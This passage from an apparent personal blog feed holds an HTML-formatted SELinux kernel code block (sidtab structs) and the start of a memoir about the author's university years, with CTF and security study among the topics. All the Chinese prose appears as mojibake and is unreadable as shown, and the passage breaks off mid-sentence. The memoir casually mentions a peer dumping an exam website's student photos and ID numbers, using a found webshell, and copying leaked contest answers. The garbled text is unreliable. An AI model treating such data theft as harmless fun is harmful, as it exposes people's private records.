class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sidtab_entry</span> &#123;</span></span><br><span class="line">u32 sid;</span><br><span class="line">u32 hash;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">context</span> <span class="title">context</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> CONFIG_SECURITY_SELINUX_SID2STR_CACHE_SIZE &gt; 0</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sidtab_str_cache</span> __<span class="title">rcu</span> *<span class="title">cache</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span> <span class="title">list</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">union</span> sidtab_entry_inner &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sidtab_node_inner</span> *<span class="title">ptr_inner</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sidtab_node_leaf</span>  *<span class="title">ptr_leaf</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sidtab_node_leaf</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sidtab_entry</span> <span class="title">entries</span>[<span class="title">SIDTAB_LEAF_ENTRIES</span>];</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sidtab_node_inner</span> &#123;</span></span><br><span class="line"><span class="keyword">union</span> sidtab_entry_inner entries[SIDTAB_INNER_ENTRIES];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sidtab_isid_entry</span> &#123;</span></span><br><span class="line"><span class="keyword">int</span> <span class="built_in">set</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sidtab_entry</span> <span class="title">entry</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sidtab_convert_params</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">convert_context_args</span> *<span class="title">args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sidtab</span> *<span class="title">target</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sidtab</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * lock-free read access only for as many items as a prior read of</span></span><br><span class="line"><span class="comment"> * 'count'</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">union</span> sidtab_entry_inner roots[SIDTAB_MAX_LEVEL + <span class="number">1</span>];</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * access atomically via &#123;READ|WRITE&#125;_ONCE(); only increment under</span></span><br><span class="line"><span class="comment"> * spinlock</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">u32 count;</span><br><span class="line"><span class="comment">/* access only under spinlock */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sidtab_convert_params</span> *<span class="title">convert</span>;</span></span><br><span class="line"><span class="keyword">bool</span> frozen;</span><br><span class="line"><span class="keyword">spinlock_t</span> lock;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> CONFIG_SECURITY_SELINUX_SID2STR_CACHE_SIZE &gt; 0</span></span><br><span class="line"><span class="comment">/* SID -&gt; context string cache */</span></span><br><span class="line">u32 cache_free_slots;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">cache_lru_list</span>;</span></span><br><span class="line"><span class="keyword">spinlock_t</span> cache_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* index == SID - 1 (no entry for SECSID_NULL) */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sidtab_isid_entry</span> <span class="title">isids</span>[<span class="title">SECINITSID_NUM</span>];</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Hash table for fast reverse context-to-sid lookups. */</span></span><br><span class="line">DECLARE_HASHTABLE(context_to_sid, SIDTAB_HASH_BITS);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;ä¸ºäº†æ›´åŠ ç†Ÿæ‚‰SELinuxï¼Œé’ˆå¯¹è¿™ä¸ªå®‰å…¨æœºåˆ¶çš„æºç éƒ¨åˆ†åšäº†ä¸€äº›æ¢³ç†ï¼Œç»“åˆäº†å®˜æ–¹çš„æŒ‡å—ä¸°å¯Œäº†å…¶ä¸­çš„æºç å®ç°ç»†èŠ‚ã€‚SELinuxåšå¤§ç²¾æ·±ï¼Œè¿™ç¯‡è®²è¿°è¯¥æœºåˆ¶çš„å†…æ ¸éƒ¨åˆ†å®ç°ï¼ŒåŒ…æ‹¬è´¯ç©¿æ•´ä¸ªæœºåˆ¶çš„ä¸¤ä¸ªæ ¸å¿ƒâ€”â€”å¯¹ç³»ç»Ÿè¡Œä¸ºçš„æ£€æŸ¥ä»¥åŠæ ‡ç­¾çš„è½¬æ¢ï¼Œä»¥åŠæ¯”è¾ƒæ ¸å¿ƒçš„æ•°æ®å’Œæ¥å£ã€‚&lt;/p&gt;
&lt;p&gt;å¤‡æ³¨ï¼š
      
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="SELinux" scheme="https://hurricane618.me/tags/SELinux/"/>
    
      <category term="æºç åˆ†æ" scheme="https://hurricane618.me/tags/%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>æˆ‘çš„äººç”Ÿä¸ƒå¹´ï¼ˆä¸€ï¼‰</title>
    <link href="https://hurricane618.me/2022/11/27/seven-years-of-my-life1/"/>
    <id>https://hurricane618.me/2022/11/27/seven-years-of-my-life1/</id>
    <published>2022-11-27T14:56:11.000Z</published>
    <updated>2022-12-19T16:11:20.730Z</updated>
    
    <content type="html"><![CDATA[<p>è·ç¦»ç ”ç©¶ç”Ÿæ¯•ä¸šå·²ç»è¿‡äº†4ä¸ªå¤šæœˆï¼Œåœ¨è¿™ä¸ªå›½åº†èŠ‚æœŸé—´é‡è§äº†å¾ˆå¤šè€åŒå­¦ï¼ŒåŒ…æ‹¬é«˜ä¸­å’Œå¤§å­¦åŒå­¦ï¼Œæ„Ÿè§‰åˆ°è¿‡äº†è¿™ä¹ˆå‡ å¹´æ¯ä¸ªäººçš„äººç”Ÿè½¨è¿¹éƒ½å‘ç”Ÿäº†ç¿»å¤©è¦†åœ°çš„å˜åŒ–ï¼Œæˆ‘æƒ³ä¹Ÿæ˜¯æ—¶å€™å¯¹è‡ªå·±ç¬¬ä¸€ä¸ªâ€œäººç”Ÿä¸ƒå¹´â€åšä¸ªæ€»ç»“ï¼Œæƒ³æŠŠè¿™äº›çè´µçš„å†…å®¹è®°å½•ä¸‹æ¥ï¼Œæˆ–è®¸å¤šå¹´ä¹‹åå†æ¬¡å›çœ‹ä¼šåˆ«æœ‰ä¸€ç•ªæ»‹å‘³åœ¨å¿ƒå¤´ã€‚è‡³äºä¸ºä»€ä¹ˆæˆ‘è¯´æ˜¯è‡ªå·±çš„ç¬¬ä¸€ä¸ªâ€œäººç”Ÿä¸ƒå¹´â€ï¼Œè¿™ä¸ƒå¹´æ˜¯æˆ‘å¤§å­¦æœ¬ç§‘å››å¹´åŠ ä¸Šç ”ç©¶ç”Ÿä¸‰å¹´çš„æ—¶å…‰ï¼Œæ²¡æœ‰æèµ·å°å­¦ä¸­å­¦æ˜¯å› ä¸ºæˆ‘è§‰å¾—é‚£æ®µæ—¶é—´ä¸ªäººèƒ½æŒæ§çš„å¹¶ä¸å¤šï¼Œå¾ˆå¤šæŠ‰æ‹©éƒ½æ˜¯è¢«å®¶é•¿ä»£æ›¿é€‰æ‹©æˆ–è€…é€¼ç€é€‰çš„ï¼Œåªæœ‰ä»è¿™ä¸ƒå¹´å¼€å§‹å¤§éƒ¨åˆ†å†³å®šéƒ½æ˜¯ç”±æˆ‘ä¸ªäººåšå‡ºï¼Œè¿™æ˜¯äººç”ŸçœŸæ­£çš„å¼€å§‹ã€‚å¸Œæœ›è¿™ä¸ªç³»åˆ—æˆ‘ä»¥åèƒ½ä¸€ç›´æ›´æ–°ä¸‹å»ï¼Œæ¯ä¸ƒå¹´åšä¸€æ¬¡æ€»ç»“ï¼Œä¸ºè‡ªå·±çš„äººç”Ÿåšå¤ç›˜ï¼Œè‡³äºä¸ºä»€ä¹ˆæ˜¯ä¸ƒå¹´ä¸ºå‘¨æœŸï¼Œå¯èƒ½æ˜¯å—åˆ°çºªå½•ç‰‡ã€Šäººç”Ÿä¸ƒå¹´ã€‹çš„å½±å“å§ã€‚</p><h2 id="å¤§ä¸€"><a href="#å¤§ä¸€" class="headerlink" title="å¤§ä¸€"></a>å¤§ä¸€</h2><p>åˆå…¥å¤§å­¦ï¼Œæ‰€æœ‰çš„ä¸€åˆ‡éƒ½æ˜¯é‚£ä¹ˆçš„æ–°é²œï¼Œå°è¯•äº†å¾ˆå¤šåŸæ¥æœªæ›¾æƒ³è¿‡çš„ä¸œè¥¿ã€‚</p><p>æœ€å¼€å§‹çš„æˆ‘å¯¹å­¦ç”Ÿä¼šæŠ±æœ‰å¹»æƒ³ï¼Œè¿˜å»å°è¯•ç«é€‰å•¥å•¥åˆ›æ–°éƒ¨ï¼Œç»“æœè¢«å¤§äºŒçš„å­¦é•¿é—®å—æ¡¥å’ŒåŒ—æ¡¥å“ªä¸ªç¦»CPUæ›´è¿‘ã€‚ã€‚ã€‚å†…å¿ƒOSï¼šæ‹œæ‰˜ï¼Œæˆ‘æ‰åˆšè¿›æ ¡å‡ å¤©ï¼Œä½ è¿™æ˜¯åœ¨åˆéš¾æˆ‘å§ã€‚ä»é‚£ä¸€åˆ»å°±å¯¹å­¦ç”Ÿä¼šæœ‰ä¸å¥½çš„å°è±¡ï¼Œæœ€åçš„ç»“æœä¹Ÿæ˜¯æˆ‘æ²¡å…¥é€‰ï¼Œä½†ä»ç°åœ¨çš„è§’åº¦æ¥çœ‹ï¼Œè¿™æ˜¯æˆ‘çš„å¹¸è¿ï¼Œå­¦ç”Ÿä¼šçš„ç»å†å¯¹æˆ‘è¯»ç ”å’Œä¹‹å‰çš„ç§‹æ‹›æ‰¾å·¥ä½œæ²¡ä»»ä½•å¸®åŠ©ï¼Œè€Œå¦å¤–ä¸€ä½å­¦é•¿å’Œæˆ‘è¯´è¿‡å­¦ç”Ÿä¼šå†…éƒ¨çš„è…æœ½å’Œä¸­å›½å®˜åœºå¦‚å‡ºä¸€è¾™ã€‚</p><p>å‚åŠ äº†ç¾½æ¯›çƒåä¼šï¼Œå¹¶ä¸”æˆä¸ºäº†è´¢åŠ¡éƒ¨çš„ä¸€å‘˜ï¼Œè™½ç„¶æ‰“çš„èœä½†è¿˜æ˜¯åœ¨ç§¯æå‚ä¸æ´»åŠ¨ã€‚å…¶ä¸­è®°å¿†çŠ¹æ–°çš„ä¸€æ¬¡æ˜¯ç»„å›¢å»è¥¿è´¢å‚åŠ è”è°Šï¼Œæˆ‘å’Œå¦å¤–ä¸€ä¸ªç”·ç”Ÿä¸ä¸¤ä¸ªå¥³ç”Ÿç»„åˆæ‰“æ··åŒï¼Œå¤§å®¶å°±è¿™æ ·æ‰“äº†ä¸€ä¸‹åˆçš„å…»ç”Ÿçƒã€‚æ™šä¸Šæ‹¿åˆ°äº†è¥¿è´¢çš„ä¸€å¼ æ˜ä¿¡ç‰‡ï¼Œåƒäº†ä¸€é¡¿ç«é”…å°±è¿™æ ·ç»“æŸäº†ã€‚åæ¥æœ‰äººé—®æˆ‘ä¸ºä»€ä¹ˆä¸è¦å¾®ä¿¡æˆ–è€…qqï¼Œæˆ‘è¿˜æ„£äº†å¥½ä¹…ï¼Œæƒ³äº†æƒ³è‡ªå·±å½“æ—¶çš„çŠ¶æ€ï¼Œåˆå…¥å¤§å­¦å®Œå…¨æ²¡æœ‰è¿™æ–¹é¢çš„æƒ³æ³•ï¼Œè¦å¥³ç”Ÿè”ç³»æ–¹å¼ï¼Ÿä¸å­˜åœ¨çš„ã€‚</p><p>å½“æ—¶ä¸ºäº†è§£å†³è‹±è¯­çš„çŸ­æ¿ï¼Œå¬ä¿¡äº†æŸä¸ªåä¸ºEGTçš„æ•™è‚²æœºæ„æŠ¥åäº†å®ƒä»¬çš„åˆçº§å’Œé«˜çº§è¯¾ç¨‹ã€‚å•çº¯çš„æˆ‘ä»¥ä¸ºåªè¦ç»è¿‡äº†è¿™å‡ å¤©çš„åŸ¹è®­ï¼Œè‹±è¯­å°±èƒ½å®Œæˆä¸€ä¸ªçªç ´ï¼Œä½†äº‹å®å°±åœ¨çœ¼å‰ï¼Œå°†æˆ‘çš„yyæ‰“å¾—ç¨€ç¢ï¼Œæœ€åç»ˆäºé¡¿æ‚Ÿåƒè‹±è¯­è¿™æ ·çš„è¯­è¨€æŠ€èƒ½ä¸å¯èƒ½ä»…é€šè¿‡å‡ å¤©å°±æœ‰è´¨çš„å˜åŒ–ï¼Œéœ€è¦é•¿æœŸçš„ç§¯ç´¯æ‰èƒ½çœ‹å‡ºæ•ˆæœã€‚ç°åœ¨å›çœ‹è¿™ä¸€æ®µç»å†ï¼Œæ„Ÿè§‰åˆ°è‡ªå·±è¿‡å»å¯¹è‡ªèº«è‹±è¯­æ°´å¹³è¿«åˆ‡çš„æå‡éœ€æ±‚è¢«ä»–äººæ‰€åˆ©ç”¨ï¼Œä»¥ååº”å½“æ›´åŠ ç†æ€§çš„æ€è€ƒå­¦ä¹ çš„äº‹æƒ…ï¼Œæƒ³è¦æå‡è‡ªå·±ä¸æ˜¯ä¸€æœä¸€å¤•å°±èƒ½åšåˆ°ï¼ŒæŒç»­ä¸æ–­çš„ç§¯ç´¯å’Œç»ƒä¹ æ‰æ˜¯å…³é”®ã€‚æƒ³æƒ³å½“åˆä¸ºäº†å‚åŠ è¿™ä¸ªEGTçš„å®£è®²ï¼Œé”™è¿‡äº†CNSSçš„å®£è®²ç®€ç›´å¤ªå¯æƒœäº†ã€‚</p><p>åç»­ä¸€æ®µæ—¶é—´å¼€å§‹åŠ å…¥æ—©è¯»é˜Ÿï¼Œè¿™ä¸ªæ—©è¯»é˜Ÿä¹Ÿæ˜¯æœ‰ç‚¹è¯´æ³•çš„ä¸œè¥¿ï¼ŒåŒæ—¶ä¹Ÿæ˜¯EGTçš„æ¶æ€§æ¯’è¯ä¹‹ä¸€ã€‚å½“æ—¶å—åˆ°EGTçš„é¼“åŠ¨ï¼Œå¼€å§‹å¹»æƒ³ç€é€šè¿‡æ—©è¯»çš„æ–¹å¼æå‡è‡ªå·±ï¼Œæˆ‘ä¾ç¨€è®°å¾—æ—©ä¸Š6ç‚¹40èµ·åºŠçš„æ—¥å­ï¼Œå› ä¸ºæˆç”µæœ¬èº«7ç‚¹åŠè¿˜æœ‰æ—©è‡ªä¹ ï¼Œæ‰€ä»¥èµ·åºŠä¹‹ååªæœ‰å¤§çº¦40åˆ†é’Ÿå·¦å³çš„æ—¶é—´å¯ä»¥æ‹¿å‡ºæ¥åšå¤šä½™çš„äº‹æƒ…ã€‚æˆ‘ä»¬å½“æ—¶ä¸»è¦çš„æ´»åŠ¨æœ‰æ™¨è·‘ï¼Œæ—©è¯»è‹±è¯­ï¼Œä¸ªäººåˆ†äº«ç­‰å†…å®¹ï¼Œè¿™ä¸€é¡¿æŠ˜è…¾ä¸‹æ¥æå¾—æˆ‘åœ¨ä¹‹åçš„ä¸“ä¸šè¯¾ä¸Šç²¾åŠ›æ¶£æ•£ï¼Œå­¦ä¹ æ•ˆç‡å¤§å¹…åº¦ä¸‹é™ã€‚æˆ‘ä¹Ÿæ˜¯æœ€æ—©ä¸€æ‰¹æ„è¯†åˆ°è¿™ä¸ªé—®é¢˜çš„äººä¹‹ä¸€ï¼Œè¿™æ ·çš„æ—©è¯»ç®€ç›´æ˜¯å› å°å¤±å¤§ï¼Œé¢ å€’ä¸»æ¬¡ï¼Œåœ¨æ•´ä¸ªè®¡åˆ’å®æ–½å¿«2ä¸ªæœˆä¹‹åæˆ‘é€‰æ‹©é€€å‡ºã€‚ç°åœ¨å¤ç›˜æƒ³æƒ³ï¼Œæˆ‘å½“æ—¶çš„å†³å®šè¿˜æ˜¯å¾ˆæ­£ç¡®çš„ï¼Œæ²¡æœ‰å› ä¸ºå¼ºåˆ¶æ—©èµ·è€Œæ¯æ‰ä¹‹åçš„å¤§å­¦ç”Ÿæ´»ã€‚ï¼ˆæš´è®ºï¼šæ™šèµ·æ¯ä¸Šåˆï¼Œæ—©èµ·å‚»ä¸€å¤©ï¼Œæ˜¯çœŸç†ï¼ï¼ï¼ï¼‰</p><h2 id="å¤§äºŒ"><a href="#å¤§äºŒ" class="headerlink" title="å¤§äºŒ"></a>å¤§äºŒ</h2><p>å¤§äºŒçš„æˆ‘å¼€å§‹æ‰¾åˆ°åŠªåŠ›çš„æ–¹å‘ï¼Œä¸å†æœ‰å¤§ä¸€çš„è¿·èŒ«ã€‚</p><p>åœ¨å¤§äºŒä¸Šå­¦æœŸçš„æ—¶å€™äº†è§£åˆ°äº†CTFï¼Œåœ¨é‚£ä¸ªè¿œå¤æ—¶æœŸå¹¶æ²¡æœ‰ç‰¹åˆ«å¤šçš„CTFèµ„æºï¼Œèƒ½åˆ·çš„OJä¹Ÿç‰¹åˆ«ç¨€å°‘ï¼Œå°è±¡æ¯”è¾ƒæ·±çš„å—é‚®OJï¼Œbugkuï¼Œå®éªŒå§ï¼Œé‡Œé¢éƒ½æ˜¯ååˆ†ç»å…¸çš„é¢˜ç›®ç±»å‹ï¼Œä»ä¸­å­¦ä¹ åˆ°äº†æœ€åŸºæœ¬çš„CTFæŠ€æœ¯ã€‚å½“æ—¶è¿˜æ˜¯webç‹—çš„æˆ‘äº†è§£åˆ°äº†æŠ“åŒ…ï¼Œçœ‹jsè„šæœ¬ï¼Œå­¦ä¹ SQLæ³¨å…¥å’Œphpé»‘é­”æ³•ï¼Œä»æ­¤æ‰“å¼€äº†CTFçš„å¤§é—¨ï¼Œä¸è¿‡ä¾æ—§æ˜¯ä¸ªå°è¾£é¸¡ã€‚</p><p>ä¸‰æ•™405æ˜¯æ•´ä¸ªå¤§å­¦æœ€å……æ»¡å›å¿†çš„åœ°æ–¹ä¹‹ä¸€ï¼Œåœ¨æ¥è§¦åˆ°CTFä¹‹åæˆ‘è¢«donotå¬é›†åˆ°äº†ä¸‰æ•™405â€”â€”Aegiså·¥ä½œå®¤çš„å‘æºåœ°ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬ä¸€èµ·åˆ·CTFé¢˜ï¼Œä¸€èµ·å­¦ä¹ webå®‰å…¨ï¼Œä¸€èµ·ç•…èŠæ”»é˜²æŠ€æœ¯ï¼Œä»¥åŠæä¸€äº›éªšæ“ä½œã€‚è®°å¿†çŠ¹æ–°çš„æ˜¯å½“æ—¶æ—å¸ˆå‚…æŠŠå››å…­çº§ç½‘ç«™çš„æ•°æ®æ‹–äº†ä¸‹æ¥ï¼Œåœ¨æœ¬åœ°å­˜äº†ä¸€ä»½ï¼Œ23333ï¼Œæˆ‘ä»¬å¾—ä»¥è§åˆ°å…¨æ ¡åŒå­¦çš„ç…§ç‰‡å’Œèº«ä»½è¯ã€‚ç”šè‡³æˆ‘ä»¬è¿˜åœ¨æŸå¤„å‘ç°äº†åˆ›å§‹äººè½ç¥çš„webshellï¼Œå½“æ—¶å±…ç„¶è¿˜è¿ä¸Šäº†ğŸ¤£ã€‚é™¤äº†è¿™äº›äº‹æƒ…ï¼Œä¹Ÿæœ‰ä¸€äº›è¦åæ§½çš„ä¸œè¥¿ï¼Œä¸‰æ•™405çš„è€é¼ æ˜¯çœŸçš„ä¸€ç»ï¼Œåƒçš„ä¸œè¥¿ç»å¯¹ä¸èƒ½æ”¾åœ¨é‚£é‡Œï¼Œä¸ç„¶ç¬¬äºŒå¤©ä½ å°†ä¼šçœ‹åˆ°å‡Œä¹±çš„æ¡Œé¢ã€‚æœ€åè¿˜æ˜¯æˆ‘çš„å­¦å¼Ÿå°é£é¸½ï¼Œæäº†ä¸ªæ•é¼ ç¬¼ï¼ŒæŠ“åˆ°äº†è¿™åªå¯æ¶çš„è€é¼ ã€‚</p><p>å¤§äºŒçš„æ—¶å€™å­¦é™¢æäº†ä¸€ä¸ªç±»ä¼¼äºç«‹äººç­çš„å“ä¸­å“ç­çº§ï¼Œæ•´ä½“åå·¥ç¨‹å¯¼å‘ï¼Œç«‹å¿—åŸ¹å…»å‡ºå“è¶Šä¸­çš„å“è¶Šï¼ˆå­¦é™¢çš„æ—¥å¸¸ç”»é¥¼ï¼‰ã€‚ç»“æœæœ€åä¹Ÿæ²¡æå‡ºä»€ä¹ˆåå ‚ï¼Œä¸è¿‡å€’æ˜¯æœ‰ä¸€äº›æ”¶è·ï¼š1ï¼‰è®¤è¯†äº†ä¸€äº›äººï¼Œxmjï¼Œ17ï¼Œwjï¼Œzxï¼›2ï¼‰åšäº†ä¸€ä¸ªæ¯”è¾ƒæœ‰æ„ä¹‰çš„çŸ¥ä¹ç¤¾äº¤ç½‘ç»œçˆ¬è™«ï¼ŒPythonçš„æŠ€èƒ½æˆä¸ºä»¥åä¸å¯æˆ–ç¼ºçš„èƒ½åŠ›ä¹‹ä¸€ï¼›3ï¼‰ä¸ºä¹‹åçš„å®ä¹ ç‰µäº†ä¸€æ¡çº¿ï¼ˆè™½ç„¶æ„Ÿè§‰æœ‰ç‚¹å‘ï¼‰ã€‚å“ä¸­å“çš„é¢å¤–å½©è›‹ï¼Œæˆ‘çš„ä¸€ä¸ªç ”ç©¶ç”ŸåŒå­¦èƒ¡çˆ·ä¹Ÿåœ¨è¿™é‡Œã€‚</p><p>ç¬¬ä¸€æ¬¡å®ä¹ å»äº†å®‰æ’çš„æˆéƒ½åˆ†å…¬å¸ï¼Œå¹»æƒ³ç€ä»æ­¤å°±èƒ½å¼€å§‹èµ°å‘å®‰å…¨çš„å¤§é—¨ï¼Œç»“æœå¾ˆæ˜¯å¤±æœ›ï¼Œå®‰æ’çš„æˆéƒ½åˆ†å…¬å¸å±…ç„¶æ²¡æœ‰åšå®‰å…¨çš„äººã€‚ã€‚ã€‚ä¹‹åå°±æ˜¯æˆ‘å’Œ17è¿˜æœ‰ä¸€ä¸ªå‡èšå¤§ä½¬windä¸€èµ·ï¼Œä¸‰ä¸ªäººåœ¨é‚£é‡Œè°ƒè¯•ç½‘ç»œï¼Œè®°å½•æ–‡æ¡£ï¼Œå”¯ä¸€çš„å¥½å¤„æ˜¯æˆ‘å­¦åˆ°äº†ä¸å°‘è®¡ç®—æœºç½‘ç»œçš„çŸ¥è¯†ã€‚å®ä¹ ä¸­çš„è¶£äº‹ï¼Œæˆ‘æ–°å»ºçš„è™šæ‹Ÿæœºç”±äºææˆäº†é—­ç¯ç½‘ç»œï¼Œè¿˜æ²¡å¼€å¯ç”Ÿæˆæ ‘åè®®ï¼Œå¯¼è‡´äº†ç½‘ç»œé£æš´æœ€åæŠŠç½‘ç»œæç‚¸äº†ï¼Œä½†ä¸çŸ¥é“ä¸ºå•¥è¿™ä¸ªäº‹æƒ…å±…ç„¶ä¼ éäº†æ•´ä¸ªç½‘å®‰ä¸“ä¸šã€‚</p><h2 id="å¤§ä¸‰"><a href="#å¤§ä¸‰" class="headerlink" title="å¤§ä¸‰"></a>å¤§ä¸‰</h2><p>ä»å¤§ä¸‰å¼€å§‹ï¼Œå„è‡ªçš„é€‰æ‹©å°†å¼•å‘ä¸åŒçš„é“è·¯ã€‚ï¼ˆè€ƒç ”ã€ä¿ç ”ã€å‡ºå›½ã€å·¥ä½œâ€¦â€¦ï¼‰</p><p>å¤§äºŒçš„æ—¶å€™çŸ¥é“äº†ç½‘ç®¡ä¼šçš„å­˜åœ¨ï¼Œåœ¨çœ‹åˆ°donotåœ¨ç½‘ç®¡ä¼šä¸­æ··çš„é£ç”Ÿæ°´èµ·ï¼Œæˆ‘ä¹Ÿå†³å®šè¿›å…¥ç½‘ç®¡ä¼šå­¦ä¹ ç½‘ç»œçŸ¥è¯†ã€‚å¤§äºŒä¸‹å­¦æœŸå¼€å§‹åˆ·ç€æ€ç§‘CCNAçš„å››æœ¬ä¹¦æ‡µæ‡µæ‡‚æ‡‚çš„å…¥é—¨äº†ï¼Œè™½ç„¶å¤§å¤šæ•°è·¯ç”±å™¨äº¤æ¢æœºçš„çŸ¥è¯†éƒ½å·²ç»å¿˜çš„å·®ä¸å¤šäº†ï¼Œä½†å…¶ä¸­çš„å­ç½‘åˆ’åˆ†ï¼Œè·¯ç”±å™¨å’Œäº¤æ¢æœºçš„å·¥ä½œåŸç†ä»ç„¶å­˜åœ¨æˆ‘çš„è„‘æµ·ä¹‹ä¸­ï¼ŒåŒæ—¶è¿™å››æœ¬ä¹¦çš„å­¦ä¹ è®©æˆ‘ä¹‹åå­¦ä¹ è®¡ç®—æœºç½‘ç»œæ—¶æ˜¾å¾—ååˆ†å¾—å¿ƒåº”æ‰‹ã€‚å¤§äºŒä¸‹å­¦æœŸçš„åŸºç¡€çŸ¥è¯†å­¦ä¹ ï¼Œå­¦é•¿å¸¦ç€å‡ºå»æ£€ä¿®ç½‘ç»œï¼Œç†Ÿæ‚‰æµ‹çº¿å™¨ç­‰ç½‘ç»œæ£€ä¿®å·¥å…·ä½¿ç”¨ï¼Œåˆ°å¤§ä¸‰ä¸Šè‡ªå·±èƒ½ä¸€ä¸ªäººç‹¬å½“ä¸€é¢çš„å»å¤„ç†å®¿èˆçš„ç½‘ç»œé—®é¢˜ï¼Œè¿™æ˜¯ä¸€æ®µéš¾å¿˜çš„ç»å†ã€‚æˆ‘ç†Ÿæ‚‰äº†å­¦æ ¡ç½‘ç»œçš„æ‹“æ‰‘ç»“æ„ï¼ŒçœŸæ­£çš„æŠŠè¯¾å ‚ä¸­çš„ç†è®ºçŸ¥è¯†ä¸ç”Ÿæ´»å®é™…ç»“åˆåœ¨ä¸€èµ·ã€‚å½“ç„¶ä¹Ÿè§£é”äº†è‡ªå·±çš„ä¸€ä¸ªæˆå°±â€”â€”å…‰æ˜æ­£å¤§è¿›å…¥å¥³ç”Ÿå®¿èˆï¼ï¼ˆæˆ‘å¯ä¸æ˜¯ä¸ºäº†è¿›å¥³ç”Ÿå®¿èˆæ‰æ¥ç½‘ç®¡ä¼šå“ˆï¼ï¼ï¼ï¼‰</p><p>ç¬¬ä¸€æ¬¡å»å‚åŠ äº†CTFçš„çº¿ä¸‹å†³èµ›æ˜¯åœ¨æ­¦æ±‰å¤§å­¦ï¼Œå½“æ—¶æ˜¯é“äººä¸‰é¡¹çš„æ€»å†³èµ›ï¼Œæˆ‘å’Œå¦å¤–ä¸€ä¸ªå­¦é•¿ä¸€èµ·åšæµé‡åˆ†æé¢˜ã€‚é¢å¯¹æ¥è¿‘20Gçš„æµé‡åŒ…ï¼Œæœ‰ç‚¹ç»æœ›ï¼Œæµé‡åˆ†æé¢˜æ¯”çš„å°±æ˜¯è€å¿ƒå’Œç»éªŒï¼Œæœ€åå‹‰å¼ºåšäº†ä¸€å¤§åŠçš„é¢˜ç›®ã€‚åœ¨ä¸´è¿‘æ¯”èµ›çš„æ—¶å€™æˆ‘ä»¬ç‹æŸäººè€å¸ˆææ¥äº†æµé‡é¢˜çš„æ¯”èµ›ç­”æ¡ˆï¼Œè¯´å®è¯å½“æ—¶çš„å†…å¿ƒå¾ˆæ˜¯çº ç»“ï¼Œæ¯•ç«Ÿæˆ‘ä»¬å½“æ—¶çš„åˆ†å°±åœ¨äºŒç­‰å¥–ä¸‰ç­‰å¥–çš„è¾¹ç•Œï¼Œè±¡å¾æ€§çš„æŠ„äº†å‡ ä¸ªç­”æ¡ˆä¸Šå»ï¼Œä½†è‡ªèº«å¯¹äºæŠ€æœ¯é‚£ä»½çº¯ç²¹çš„å¿ƒé˜»æ­¢äº†ç»§ç»­æŠ„ç­”æ¡ˆçš„è¡Œä¸ºï¼Œæœ€ç»ˆæˆ‘ä»¬åªæ‹¿äº†æ€»å†³èµ›çš„ä¸‰ç­‰å¥–ã€‚ç°åœ¨å›çœ‹è¿™é‡Œçš„é€‰æ‹©ï¼ŒäºŒç­‰å¥–å’Œä¸‰ç­‰å¥–å…¶å®æ²¡å•¥åŒºåˆ«ï¼Œä½†æˆ‘è‡³å°‘ä¿ä½äº†æŠ€æœ¯äººæœ€åçš„å°Šä¸¥ï¼Œåº”å½“å°Šé‡ä»–äººçš„å®åŠ›å’ŒåŠªåŠ›ï¼Œå¦‚æœè®©æˆ‘å†é€‰ä¸€æ¬¡ï¼Œæˆ‘ä¾æ—§æ˜¯åŒæ 